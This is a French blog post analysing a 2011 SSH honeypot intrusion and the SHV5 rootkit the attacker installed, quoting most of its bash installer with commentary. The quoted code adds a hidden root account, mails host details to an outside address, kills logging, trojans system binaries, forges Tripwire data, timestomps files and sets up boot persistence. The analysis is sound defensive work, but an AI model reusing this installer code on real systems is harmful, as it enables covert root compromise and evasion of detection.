---
title: "Intrusion du 19 juillet 2011 : Analyse du rootkit SHV5"
tags: [honeypot, rootkit, reverse engineering]
---

## Introduction

Le 19 juillet 2011, un nouvel intrus a fait irruption sur ce qu'il pensait être un système Unix faisant tourner un serveur SSH alors qu'il s'agissait en réalité du honeypot SSH, un outil destiné à leurrer les hackers, surveiller leurs activités et récupérer leurs scripts.  

Le pirate n'est pas apparu par hasard sur la machine. Il a réalisé une attaque brute force sur le compte root du serveur SSH simulé par `Kippo`.  

Sur cette journée j'ai eu deux attaques brute force concluantes : la première à 10h49 provenant de l'IP `84.14.252.138` et la seconde à 12h03 venant de `123.30.49.8`.  

Difficile de dire sur laquelle de ces attaques s'est basé le pirate puisqu'il a fait une connexion directe plus tard avec une IP différente : `174.36.18.156`.  

La première commande lancée sur le système a été `w` pour s'assurer qu'il était le seul connecté sur le serveur et que sa présence ne serait pas vue par un autre utilisateur.  

Il a ensuite affiché le contenu du fichier `/proc/cpuinfo` pour obtenir des informations sur le système et lancé `ifconfig` pour afficher les interfaces réseau.  

La commande `wget` a aussi été lancée sans arguments, juste pour vérifier que le programme était bien présent sur le système.  

Pour empêcher l'historisation de sa session il a copié/collé la commande suivante :

```bash
unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER
```

Il s'est ensuite placé dans le dossier `/var/tmp` pour récupérer avec `wget` un fichier à l'adresse http://unixcrew.t35.com/rk.jpg

Ce fichier à l'extension `jpg` est en réalité une archive `tgz` qui une fois décompressée génère un dossier `.rc` contenant un fichier `setup` ainsi que d'autres archives `tgz`.  

Le pirate ne prend pas plus de temps pour explorer le système et exécute immédiatement le script avec `./setup unixteam 1985`.  

SHV5 : Script d'installation
----------------------------

Le fichier `setup` est un script bash qui installe un rootkit bien connu de la famille des `SHVx` (ici `SHV5`). Dû à la longueur du fichier, nous l'étudierons en plusieurs morceaux.  

Première partie :  

```bash
#!/bin/bash
#
# shv5-internal-release
# by: TheDemon
# PRIVATE ! DO NOT DISTRIBUTE BITCHEZ !

# BASIC DEFINES
DEFPASS=dacialogan
DEFPORT=7000
BASEDIR=`pwd`

# DON`T TOUCH BELOW UNLESS YOU KNOW WHAT U`R DOING !
# BEFORE WE MOVE ON LET`s WORK ON SAFE-GROUND !
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

# RAINBOW COLOURS :)
BLK='^[1;30m'
RED='^[1;31m'
GRN='^[1;32m'
YEL='^[1;33m'
BLU='^[1;34m'
MAG='^[1;35m'
CYN='^[1;36m'
WHI='^[1;37m'
DRED='^[0;31m'
DGRN='^[0;32m'
DYEL='^[0;33m'
DBLU='^[0;34m'
DMAG='^[0;35m'
DCYN='^[0;36m'
DWHI='^[0;37m'
RES='^[0m'

# HOPE U`R NO TRYING THIS FROM USER !
# HOWEVER LET`S SEE WHAT KINDA KID U ARE ?
if [ "$(whoami)" != "root" ]; then
  echo "${DCYN}[${WHI}sh${DCYN}] ${WHI} BECOME ROOT AND TRY AGAIN ${RES}"
  echo ""
  exit
fi

# UNZIPING SHITS
tar zxf ./bin.tgz
tar zxf ./conf.tgz
tar zxf ./lib.tgz
tar zxf ./utilz.tgz
cd ./bin; tar zxf ./sshd.tgz
./a
rm -rf ./sshd.tgz
cd $BASEDIR
rm -rf bin.tgz conf.tgz lib.tgz utilz.tgz

sleep 2

cd $BASEDIR

killall -9 syslogd >/dev/null 2>&1

startime=`date +%S`

echo "${DCYN}[${WHI}sh${DCYN}]# Installing shv5 ... this wont take long ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# If u think we will patch your holes shoot yourself !${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# so patch manualy and fuck off!  ${RES}"
echo ""
echo ""
echo "${WHI}============================================================================${RES}"
echo ""
echo "${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\n\r\t - Do not use this version.\n\n${RES}"
echo "${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}"
echo "${YEL}##########${DRED}RRRRR   AAAAAAAA   PPPPP    HH  HH${YEL}##########${RES}"
echo "${YEL}##########${DRED}RR   R  AAA  AAA   PP   P   HH  HH${YEL}##########${RES}"
echo "${YEL}##########${DRED}RR   R  AA    AA   PP   P   HH  HH${YEL}##########${RES}"
echo "${YEL}##########${DRED}RRRRR   AAAAAAAA   PPPPP    HHHHHH${YEL}##########${RES}"
echo "${YEL}##########${DRED}RR R    AA    AA   PP       HH  HH${YEL}##########${RES}"
echo "${YEL}##########${DRED}RR RR   AA    AA   PP       HH  HH${YEL}##########${RES}"
echo "${YEL}##########${DRED}RR  RR  AA    AA   PP       HH  HH${YEL}##########${RES}"
echo "${DCYN}#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@${RES}"
echo ""
echo "${WHI}============================================================================${RES}"
echo ""
sleep 2

echo "${DCYN}[${WHI}sh${DCYN}]# backdooring started on ${WHI}`hostname -f`${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ${RES}"

SYSLOGCONF="/etc/syslog.conf"

echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for remote logging...  ${RES}"

REMOTE=`grep -v "^#" "$SYSLOGCONF" | grep -v "^$" | grep "@" | cut -d '@' -f 2`

if [ ! -z "$REMOTE" ]; then
  echo "${DCYN}[${WHI}sh${DCYN}]# May Allah help us!${RES}"
  echo
  echo '${RED} REMOTE LOGGING DETECTED ${RES}'
  echo '${DCYN}[${WHI}sh${DCYN}]# I hope you can get to these other computer(s): ${RES}'
  echo
  for host in $REMOTE; do
    echo -n "            "
    echo $host
  done
  echo
  echo ' ${WHI} cuz this box is LOGGING to it... ${RES}'
  echo
  else
  echo " ${WHI} guess not.${RES}"
fi
```

Cette première partie constitue principalement la présentation du code. Si on cherche sur Internet une copie de ce script on remarque que le nom de l'auteur a été changé. Encore du plagiat.  

Deux variables intéressantes sont définies. La première est un mot de passe `dacialogan` qui s'accorde bien avec la supposée nationalité (roumaine) des intrus. La seconde variable intéressante est un numéro de port : 7000.  

Le programme désarchive ensuite des fichiers compressés aux noms explicites (`bin` pour les binaires, `conf` pour la configuration etc)  

Un appel discret à un script baptisé `a` est fait. Voici le contenu du script en question :

```bash
password="alex1985"                                                                                                                                                                                                                
pass=$(perl -e 'print crypt($ARGV[0], "wtf")' $password)                                                                                                                                                                           
/usr/sbin/useradd -o -u 0 -g 0 -d /tmp -s /bin/bash -p $pass -f -1 pupacila
/sbin/ifconfig | grep inet | mail -s "inca un root" norocos@canadianbiotech.com
exit
```

On a ici un ajout automatique d'un compte utilisateur ainsi qu'une référence à une adresse email pour le moins suspects...

Pour terminer, le `setup` analyse brièvement le fichier de configuration de `syslog` pour déterminer si les logs sont envoyés sur un serveur distant.  

Voyons la suite du script :

```bash
#######################################################################
## CHEKING FOR MALICIOUS ADMIN TOOLS !(like tripwire, snort, etc...) ##
##                                                                   ##
#######################################################################

echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for tripwire...  ${RES}"

uname=`uname -n`
twd=/var/lib/tripwire/$uname.twd

if [ -d /etc/tripwire ]; then
  echo "${WHI} ALERT: TRIPWIRE FOUND! ${RES}"

  if [ -f /var/lib/tripwire/$uname.twd ]; then
    chattr -isa $twd
    echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for tripwire-database... ${RES}"
    echo "${RED} ALERT! tripwire database found ${RES}"
    echo "${DCYN}[${WHI}sh${DCYN}]# ${WHI} dun worry we got handy-tricks for this :) ${RES}"
    echo "-----------------------------------------" > $twd
    echo "Tripwire segment-faulted !" >> $twd
    echo "-----------------------------------------" >> $twd
    echo "" >> $twd
    echo "The reasons for this may be: " >> $twd
    echo "" >> $twd
    echo "corrupted disc-geometry, possible bad disc-sectors" >> $twd
    echo "corrupted files while checking for possible change etc." >> $twd
    echo ""
    echo "pls. rerun tripwire to build the database again!" >> $twd
    echo "" >> $twd
  else
    echo "${WHI} lucky you: Tripwire database not found. ${RES}"
  fi
else
  echo "${WHI} guess not. ${RES}"
fi
```

Cette partie du script regarde si `Tripwire`, un outil de vérification d'intégrité des fichiers, est installé sur la machine. Le rootkit ne cherche pas à leurrer `Tripwire` car l'opération est délicate.
D'autant plus que, comme on le verra dans la suite de ce script setup, `SHV5` est un rootkit qui fonctionne par remplacement des binaires sur le système donc moins évolué et facilement détectable comparé à un rootkit noyau.  

Ici `SHV5` insère dans la base de données de `Tripwire` un message d'erreur (probablement récupéré dans le code de `Tripwire`) destiné à faire croire l'administrateur du système que le disque dur a des secteurs défectueux.  

Reprenons l'analyse du setup :

```bash
# restoring login
if [ -f /sbin/xlogin ]; then
  chattr -isa /sbin/xlogin
  chattr -isa /bin/login
  mv -f /sbin/xlogin /bin/login
  chmod 7455 /bin/login
  chattr +isa /bin/login
fi

echo "${DCYN}[${WHI}sh${DCYN}]# [Installing trojans....] ${BLU} ${RES}"

if [ -f /etc/sh.conf ]; then
  chattr -isa /etc/sh.conf
  rm -rf /etc/sh.conf
fi

# checking if we got needed libs and filez
if [ ! -f /lib/libproc.a ]; then
  mv lib/libproc.a /lib/
fi

if [ ! -f /lib/libproc.so.2.0.6 ]; then
  mv lib/libproc.so.2.0.6 /lib/
fi

/sbin/ldconfig >/dev/null 2>&1

#if [ -f /lib/libncurses.so.5 ]; then
#  echo ""
#else
#  ln -s /lib/libncurses.so.4 /lib/libncurses.so.5 2>/dev/null
#fi

if [ -f /.bash_history ]; then
  chattr -isa /.bash_history >/dev/null 2>&1
  rm -rf /.bash_history
fi

if [ -f /bin/.bash_history ]; then
  chattr -isa /bin/.bash_history
  rm -rf /bin/.bash_history
fi

if [ ! -f /usr/bin/md5sum ]; then
  touch -acmr /bin/ls bin/md5sum
  cp bin/md5sum /usr/bin/md5sum
fi
```

Plusieurs commandes ne semblent pas avoir de sens. La référence à un binaire nommé `xlogin` n'est pas retrouvée ensuite. Il peut s'agir d'une ligne laissée lors d'un changement de version ou un test oublié par l'auteur...  

Le fichier `/etc/sh.conf` n'existe pas sur un système standard. Il s'agit d'un des fichiers qui est créé ensuite par le rootkit. Ce dernier fait donc le ménage avant de s'installer.  

La librairie `libproc` est une librairie que l'on ne trouve plus sur les systèmes actuels mais qui à l'époque était utilisée par les binaires `ps`, `top`, `pstree`. Cela en faisait une cible privilégiée des hackers car il suffisait de modifier cette librairie pour agir sur les résultats de plusieurs binaires à la fois.  

La librairie `ncurses` est notamment utilisée par les programmes `top` et `pstree`.  

La présence d'un fichier `.bash_history` sous la racine / ou dans le dossier `/bin` semble être un pur fruit de l'imagination de l'auteur. Il n'existe pas de tels fichiers à ces emplacements.  

Enfin le script remplace le programme de hachage `md5sum` par le sien et lui donne pour date celles de `/bin/ls`. Il aurait été plus judicieux de copier celles du `md5sum` original !

```bash
if test -n "$1" ; then
  echo "${DCYN}[${WHI}sh${DCYN}]# Using Password : ${WHI}$1 ${BLU} ${RES}"
  cd $BASEDIR/bin
  echo -n $1|md5sum > /etc/sh.conf
else
  echo "${DCYN}[${WHI}sh${DCYN}]# ${WHI} No Password Specified, using default - $DEFPASS ${BLU} ${RES}"
  echo -n $DEFPASS|md5sum > /etc/sh.conf
fi

touch -acmr /bin/ls /etc/sh.conf
chown -f root:root /etc/sh.conf
chattr +isa /etc/sh.conf
```

Dans les lignes ci-dessus, le programme place dans le fichier `/etc/sh.conf` le hash md5 d'un mot de passe choisi par l'utilisateur.
S'il est passé par argument, il s'agira du premier argument passé au `setup`, sinon ce sera celui indiqué dans la source du `setup` que l'on a vu au début (`dacialogan`).  

Dans notre cas, on a vu que le pirate a passé la chaine `unixteam` au `setup`. Ce sera donc son mot de passe.  

Des attributs spéciaux sont placés sur le fichier pour rendre difficile sa suppression par un administrateur ayant de faibles connaissances.

```bash
if test -n "$2" ; then
  echo "${DCYN}[${WHI}sh${DCYN}]# Using ssh-port : ${WHI}$2 ${RES}"
  echo "Port $2" >> $BASEDIR/bin/.sh/sshd_config
  echo "3 $2" >> $BASEDIR/conf/hosts.h
  echo "4 $2" >> $BASEDIR/conf/hosts.h
  port=$2
  cat $BASEDIR/bin/.sh/shdcf2 >> $BASEDIR/bin/.sh/sshd_config; rm -rf $BASEDIR/bin/.sh/shdcf2
  mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf
else
  echo "${DCYN}[${WHI}sh${DCYN}]# No ssh-port Specified, using default - $DEFPORT ${BLU} ${RES}"
  echo "Port $DEFPORT" >> $BASEDIR/bin/.sh/sshd_config
  echo "3 $2" >> $BASEDIR/conf/hosts.h
  echo "4 $2" >> $BASEDIR/conf/hosts.h
  port=$DEFPORT
  cat $BASEDIR/bin/.sh/shdcf2 >> $BASEDIR/bin/.sh/sshd_config; rm -rf $BASEDIR/bin/.sh/shdcf2
  mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf
fi

/sbin/iptables -I INPUT -p tcp --dport $port -j ACCEPT
```

À l'instar du mot de passe, un port est défini à partir de la ligne de commande ou de la source. Dans notre cas, ce sera 1985 et non 7000.

On peut supposer que 1985 est la date de naissance de l'intrus...  

Ce port est utilisé pour configurer un serveur SSH (fichier `sshd_config`). On remarque aussi que le numéro de port est placé dans le fichier `hosts.h`.  

Le reste du fichier `sshd_config` est ensuite rempli par un fichier nommé `shdcf2` qui contient les directives nécessaires pour que le serveur ssh fonctionne normalement.  

Ces fichiers en rapport avec ssh sont extrait depuis une archive nommée `sshd.tgz` qui était elle-même présente dans `bin.tgz`. Parmi ces fichiers on trouve la clé privée du serveur SSH. Il est fort à parier que les pirates utilisant ce rootkit ont laissé la clé d'origine sans chercher à en générer une eux même.  

Le binaire baptisé `sshd` qui est présent dans l'archive n'est pas un serveur SSH traditionnel. D'abord il est compilé statiquement et fait 208Ko. Sur mon système, le sshd est compilé dynamiquement et fait 533Ko ! Il s'agit donc plus d'une backdoor sécurisée que d'un vrai serveur SSH.  

Ajouté à ça, un `strings` sur le binaire révèle très peu de choses. En fait on trouve uniquement les chaînes suivantes :

```plain
Linux
$Info: This file is the propert of SH-crew team designed for test
purposes. $
$Nr: SH- April/2003 produced in SH-labs for Linux Systems.Run and
enjoy. $
```

Personnellement je n'utiliserais pas un binaire aussi suspect même si c'était pour pirater une machine.

```bash
if [ -f /lib/lidps1.so ]; then
  chattr -isa /lib/lidps1.so
  rm -rf /lib/lidps1.so
fi
```

Le fichier `lidps1.so` n'est pas une librairie. C'est un fichier texte qui semble contenir le nom de commandes / exécutables : `ttyload`, `shsniff`, `shp`, `hide`, `burim`, `synscan`, `mirkforce`, `ttymon` et `sh2-power`.

```bash
if [ -f /usr/include/hosts.h ]; then
  chattr -isa /usr/include/hosts.h
  rm -rf /usr/include/hosts.h
fi
```

 Le fichier `hosts.h` contient des débuts d'adresse IP et des numéros de ports qui seront cachés par les versions modifiées de `netstat` et `lsof` (?).  

 Le contenu du fichier par défaut est le suivant :

```plain
2 212.110
2 195.26
2 194.143
2 62.220
2 193.231
3 2002
4 2002
3 6667
3 8080
4 8080
4 6667
```

On peut émettre l'hypothèse que le numéro qui précède sert à définir le type. 2 pour une adresse IP, 3 pour un port TCP, 4 pour un port UDP... C'est une idée.

```bash
if [ -f /usr/include/file.h ]; then
  chattr -isa /usr/include/file.h
  rm -rf /usr/include/file.h
fi
```

Le fichier `file.h` contiendra comme on s'en doute les fichiers à dissimuler sur le système.  

Son contenu est le suivant :

```plain
sh.conf
libsh
.sh
system
shsb
libsh.so
ttylib
shp
shsniff
srd0
```

 On retrouve bien sûr le fichier `sh.conf` et d'autres fichiers croisés précédemment. Ce qui est nouveau c'est le `srd0` qui ressemble à un périphérique.

```bash
if [ -f /usr/include/log.h ]; then
  chattr -isa /usr/include/log.h
  rm -rf /usr/include/log.h
fi
```

Ce fichier contient les mots `mirkforce`, `synscan` et `syslog`...

```bash
if [ -f /usr/include/proc.h ]; then
  chattr -isa /usr/include/proc.h
  rm -rf /usr/include/proc.h
fi
```

Ce fichier contient tous les noms de processus qui devront être dissimulés aux yeux des utilisateurs du système.  

Étudions la suite du `setup` :

```bash
cd $BASEDIR
mv $BASEDIR/conf/lidps1.so /lib/lidps1.so
touch -acmr /bin/ls /lib/lidps1.so
touch -acmr /bin/ls $BASEDIR/conf/*
mv $BASEDIR/conf/* /usr/include/

# Ok lets start creating dirs
SSHDIR=/lib/libsh.so
HOMEDIR=/usr/lib/libsh

if [ -d /lib/libsh.so ]; then
  chattr -isa /lib/libsh.so
  chattr -isa /lib/libsh.so/*
  rm -rf /lib/libsh.so
fi

if [ -d /usr/lib/libsh ]; then
  chattr -isa /usr/lib/libsh
  chattr -isa /usr/lib/libsh/*
  rm -rf /usr/lib/libsh/*
fi

mkdir $SSHDIR
touch -acmr /bin/ls $SSHDIR
mkdir $HOMEDIR
touch -acmr /bin/ls $HOMEDIR

cd $BASEDIR/bin
mv .sh/* $SSHDIR/
mv .sh/.bashrc $HOMEDIR

[coupé]

cp /bin/bash $SSHDIR
```

Par souci de lisibilité, j'ai retiré certaines lignes. Le script place ses binaires dans les dossiers `/usr/lib/libssh` et `/lib/libsh.so`. Ces dossiers étant hardcodés il est aisé pour un administrateur ou un outil de sécurité de vérifier leur présence
 même si les binaires ont été modifiés.

```bash
# INITTAB SHUFFLING
chattr -isa /etc/inittab
cat /etc/inittab |grep -v ttyload|grep -v getty > /tmp/.init1
cat /etc/inittab |grep getty > /tmp/.init2

echo "# Loading standard ttys" >> /tmp/.init1
echo "0:2345:once:/usr/sbin/ttyload" >> /tmp/.init1
cat /tmp/.init2 >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# modem getty." >> /tmp/.init1
echo "# mo:235:respawn:/usr/sbin/mgetty -s 38400 modem" >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# fax getty (hylafax)" >> /tmp/.init1
echo "# mo:35:respawn:/usr/lib/fax/faxgetty /dev/modem" >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# vbox (voice box) getty" >> /tmp/.init1
echo "# I6:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI6" >> /tmp/.init1
echo "# I7:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI7" >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# end of /etc/inittab" >> /tmp/.init1

echo "/sbin/ttyload -q >/dev/null 2>&1" > /usr/sbin/ttyload
echo "/sbin/ttymon >/dev/null 2>&1" >> /usr/sbin/ttyload
echo "/sbin/ttylib >/dev/null 2>&1" >> /usr/sbin/ttyload
echo "/sbin/iptables -I INPUT -p tcp --dport $port -j ACCEPT" >> /usr/sbin/ttyload
echo "iptables -I INPUT -p tcp --dport $port -j ACCEPT" >> /usr/sbin/ttyload

touch -acmr /bin/ls /usr/sbin/ttyload
chmod +x /usr/sbin/ttyload
chattr +isa /usr/sbin/ttyload
/usr/sbin/ttyload >/dev/null 2>&1

touch -amcr /etc/inittab /tmp/.init1
mv -f /tmp/.init1 /etc/inittab
rm -rf /tmp/.init2

# MAKING SURE WE GOT IT BACKDORED RIGHT !
if [ ! "`grep ttyload /etc/inittab`" ]; then
  echo "${RED}[${WHI}sh${RED}]# WARNING - SSHD WONT BE RELOADED UPON RESTART"
  echo "${RED}[${WHI}sh${RED}]# inittab shuffling probly fucked-up !"
fi
```

Le setup créé un fichier `/usr/sbin/ttyload` qui sera chargé par init par le biais de `inittab`. On remarque que des lignes inutiles (car commentées) sont aussi insérées... Probablement pour essayer de noyer le poisson.  

Il ouvre aussi l'accès au port choisi par le pirate par le biais de `iptables`. Comme expliqué sur une autre analyse ce n'est pas forcément effectif : le firewall n'est pas forcément sur la même machine.

```bash
# Say hello to md5sum fixer boys n gurls !
if [ -f /sbin/ifconfig ]; then
  /usr/bin/md5sum /sbin/ifconfig >> .shmd5
fi
if [ -f /bin/ps ]; then
  /usr/bin/md5sum /bin/ps >> .shmd5
fi
if [ -f /bin/ls ]; then
  /usr/bin/md5sum /bin/ls >> .shmd5
fi

[coupé]

if [ -f /usr/bin/md5sum ]; then
  /usr/bin/md5sum /usr/bin/md5sum >> .shmd5
fi
```

Bonjour md5 fixer ! :D  

`md5sum` fait partie des fichiers backdoorés. Le rôle de la backdoor est de retourner une fausse somme de contrôle md5 qui rassurera l'administrateur. Pour cela il faut stocker les md5 des binaires originaux pour les retourner plus tard. C'est à ça que sert le fichier `.shmd5` que l'on voit ici.  

On notera que si `md5sum` est backdooré, ce n'est pas le cas de `sha1sum`...

```bash
if [ ! -f /dev/srd0 ]; then
  ./encrypt -e .shmd5 /dev/srd0
  touch -acmr /bin/ls /dev/srd0
  chattr a+r /dev/srd0
  chown -f root:root /dev/srd0
fi

rm -rf .shmd5
```

On trouve ici notre fichier `srd0` qui est effectivement créé dans `/dev`. Il est généré depuis le fichier de signatures `.shmd5` par le binaire `encrypt`.  

Je ne peux pas dire grand-chose sur ce binaire si ce n'est que AVG le détecte comme `Linux/Agent2.V`, qu'il pèse 15Ko, qu'il est compilé dynamiquement et strippé.  

On trouve les chaines `Encrypt / Decrypt tool`, `for all files !` et `syntx:`. Il prend l'option `-e` pour chiffrer et `-d` pour déchiffrer.  

Un `nm -D` lancé sur le binaire révèle qu'il n'utilise que des fonctions de base (`fopen`, `fgets`, `strncpy`, `memcpy` etc). Sans étude plus poussée impossible de dire quel algorithme est utilisé toutefois le fichier généré ne doit pas être du type périphérique ce qui rend sa présence dans `/dev` suspecte. C'est pour cela que les autres binaires cherchent à le cacher.

```bash
# time change bitch

touch -acmr /sbin/ifconfig ifconfig >/dev/null 2>&1
touch -acmr /bin/ps ps >/dev/null 2>&1
touch -acmr /usr/bin/md5sum md5sum >/dev/null 2>&1
md5sum="norocos@canadianbiotech.com"
```

C'est explicite : on recopie les dates des binaires originaux pour passer inaperçu. Je n'ai pas mis toutes les lignes. Cette fois il repasse sur le `md5sum`. On relève l'adresse email.

```bash
# Backdoor ps/top/du/ls/netstat/etc..
cd $BASEDIR/bin
BACKUP=/usr/lib/libsh/.backup
mkdir $BACKUP

# ps ...
if [ -f /usr/bin/ps ]; then
  chattr -isa /usr/bin/ps
  cp /usr/bin/ps $BACKUP
  mv -f ps /usr/bin/ps
  chattr +isa /usr/bin/ps
fi

# syslogd ...
# we won`t trojan it coz its too sensitive and won`t work.
# Admin will notice it upon system-restart!

#if [ -f /sbin/syslogd ]; then
#  chattr -isa /sbin/syslogd
#  cp /sbin/syslogd $BACKUP
#  mv -f syslogd /sbin/syslogd 
#  chattr +isa /sbin/syslogd
#fi
```

Les binaires sont écrasés et les dates originales conservées dans le déplacement avec l'option `-f` de `mv`. Le script conserve une copie des binaires originaux en cas de problème, et il peut y en avoir : architecture ou version de la libc incompatible... Comme le script ne fait aucune vérification ça peut très bien casser le système.  

Les backups pourraient toutefois s'avérer utiles à un administrateur qui veut corriger son système quoiqu'il est plus sûr de réinstaller le système complètement.

```bash
echo "${DCYN}[${WHI}sh${DCYN}]# : ps/ls/top/netstat/ifconfig/find/ and rest backdoored${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# [Installing some utils...] ${RES}"

cd $BASEDIR

#if [ ! -f /usr/bin/wget ]; then
#  touch -acmr /bin/ls ./bin/wget
#  chmod 744 ./bin/wget
#  mv ./bin/wget /usr/bin/wget
#fi

# PICO WILL MAKE RK GROW BIG!
# SO FUCK OFF AND USE vi !

#if [ ! -f /usr/bin/pico ]; then
#  touch -acmr /bin/ls ./pico
#  chmod 744 ./pico
#  mv ./pico /usr/bin/pico
#fi
```

Pour une fois, je suis d'accord. `Pico` ça craint ! Utilisez `Vim` !

```bash
touch -acmr /bin/ls $BASEDIR/utilz
touch -acmr /bin/ls $BASEDIR/utilz/*
mv $BASEDIR/utilz $HOMEDIR/

echo "${DCYN}[${WHI}sh${DCYN}]# : mirk/synscan/others... moved ${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# [Moving our files...] ${RES}"

mkdir $HOMEDIR/.sniff
mv $BASEDIR/bin/shsniff $HOMEDIR/.sniff/shsniff
mv $BASEDIR/bin/shp $HOMEDIR/.sniff/shp
mv $BASEDIR/bin/shsb $HOMEDIR/shsb
mv $BASEDIR/bin/hide $HOMEDIR/hide

touch -acmr /bin/ls $HOMEDIR/.sniff/shsniff
touch -acmr /bin/ls $HOMEDIR/.sniff/shp
touch -acmr /bin/ls $HOMEDIR/shsb
touch -acmr /bin/ls $HOMEDIR/hide

chmod +x $HOMEDIR/.sniff/*
chmod +x $HOMEDIR/shsb
chmod +x $HOMEDIR/hide

echo "${DCYN}[${WHI}sh${DCYN}]# : sniff/parse/sauber/hide moved ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# [Modifying system settings to suite our needs] ${RES}"
```

Le `setup` place quelques outils qui étaient dans `utilz.tgz`. On y retrouve d'autres programmes signés `SH-TEAM`.

```bash
# CHECKING FOR VULN DAEMONS
# JUST WARNING NOT PATCHING HeH
echo "${DCYN}[${WHI}sh${DCYN}]# Checking for vuln-daemons ...  ${RES}"

ps aux > /tmp/.procs

if [ "`cat /tmp/.procs | grep named`" ]; then
  echo "${RED}[${WHI}sh${RED}]# NAMED found - patch it bitch !!!!  ${RES}"
fi

if [ -f /usr/sbin/wu.ftpd ]; then
  echo "${RED}[${WHI}sh${RED}]# WU-FTPD found - patch it bitch !!!!  ${RES}"
fi

if [ "`cat /tmp/.procs | grep smbd`" ]; then
  echo "${RED}[${WHI}sh${RED}]# SAMBA found - patch it bitch !!!!  ${RES}"
fi

if [ "`cat /tmp/.procs | grep rpc.statd`" ]; then
  echo "${RED}[${WHI}sh${RED}]# RPC.STATD found - patch it bitch !!!! ${RES}"
fi

rm -rf /tmp/.procs
netstat -natp > /tmp/.stats

if [ "`cat /tmp/.stats | grep 443 | grep http`" ]; then
  echo "${RED}[${WHI}sh${RED}]# MOD_SSL found - patch it bitch !!!! ${RES}"
fi

rm -rf /tmp/.stats

# CHECKING FOR HOSTILE ROOTKITS/BACKDORS
mkdir $HOMEDIR/.owned

if [ -f /etc/ttyhash ]; then
  chattr -AacdisSu /etc/ttyhash
  rm -rf /etc/ttyhash
fi

if [ -d /lib/ldd.so ]; then
  chattr -isa /lib/ldd.so
  chattr -isa /lib/ldd.so/*
  mv /lib/ldd.so $HOMEDIR/.owned/tk8
  echo "${RED}[${WHI}sh${RED}]# tk8 detected and owned ...!!!! ${RES}"
fi

if [ -d /usr/src/.puta ]; then
  chattr -isa /usr/src/.puta
  chattr -isa /usr/src/.puta/*
  mv /usr/src/.puta $HOMEDIR/.owned/tk7
  echo "${RED}[${WHI}sh${RED}]# tk7 detected and owned ...!!!! ${RES}"
fi

if [ -f /usr/sbin/xntpd ]; then
  chattr -isa /usr/sbin/xntpd
  rm -rf /usr/sbin/xntpd
fi

if [ -f /usr/sbin/nscd ]; then
  chattr -isa /usr/sbin/nscd
  rm -rf /usr/sbin/nscd
fi

if [ -d /usr/include/bex ]; then
  chattr -isa /usr/info/termcap.info-5.gz; rm -rf /usr/info/termcap.info-5.gz
  chattr -isa /usr/include/audit.h; rm -rf /usr/include/audit.h
  chattr -isa /usr/include/bex
  chattr -isa /usr/include/bex/*
  mv /usr/include/bex/ $HOMEDIR/.owned/bex2
  if [ -f /var/log/tcp.log ]; then
    chattr -isa /var/log/tcp.log
    cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog
  fi
  chattr -isa /usr/bin/sshd2 >/dev/null 2>&1
  rm -rf /usr/bin/sshd2 >/dev/null 2>&1
  echo "${RED}[${WHI}sh${RED}]# beX2 detected and owned ...!!!! ${RES}" 
fi

if [ -d /dev/tux/ ]; then
  chattr -isa /usr/bin/xsf >/dev/null 2>&1
  rm -rf /usr/bin/xsf >/dev/null 2>&1
  chattr -isa /usr/bin/xchk >/dev/null 2>&1
  rm -rf /usr/bin/xchk >/dev/null 2>&1
  chattr -isa /dev/tux >/dev/null 2>&1
  mv /dev/tux $HOMEDIR/.owned/tuxkit
  echo "${RED}[${WHI}sh${RED}]# tuxkit detected and owned ...!!!!  ${RES}" 
fi

if [ -f /usr/bin/ssh2d ]; then
  chattr -isa /usr/bin/ssh2d
  rm -rf /usr/bin/ssh2d
  chattr -isa /lib/security/.config/
  chattr -isa /lib/security/.config/*
  rm -rf /lib/security/.config
  echo "${RED}[${WHI}sh${RED}]# optickit detected and removed ...!!!! ${RES}" 
fi

if [ -f /etc/ld.so.hash ]; then
  chattr -isa /etc/ld.so.hash
  rm -rf /etc/ld.so.hash
fi
```

Amusant... Le `setup` retire les rootkits qui pourrait être présents sur votre système et vous prévient si des démons à la sécurité hasardeuse sont présents (compris bitch ?)  

La suite est dans le même ordre d'idée :

```bash
chattr +isa /usr/lib/libsh
chattr +isa /lib/libsh.so

# GREPPING SHITZ FROM rc.sysinit and inetd.conf
if [ -f /etc/rc.d/rc.sysinit ]; then
  chattr -isa /etc/rc.d/rc.sysinit
  cat /etc/rc.d/rc.sysinit | grep -v "# Xntps (NTPv3 daemon) startup.."| grep -v "/usr/sbin/xntps"| grep -v "/usr/sbin/nscd" > /tmp/.grep
  chmod +x /tmp/.grep
  touch -acmr /etc/rc.d/rc.sysinit /tmp/.grep
  mv -f /tmp/.grep /etc/rc.d/rc.sysinit
  rm -rf /tmp/.grep
fi

if [ -f /etc/inetd.conf ]; then
  chattr -isa /etc/inetd.conf
  cat /etc/inetd.conf | grep -v "6635"| grep -v "9705" > /tmp/.grep
  touch -acmr /etc/inted.conf /tmp/.grep
  mv -f /tmp/.grep /etc/inetd.conf
  rm -rf /tmp/.grep
fi

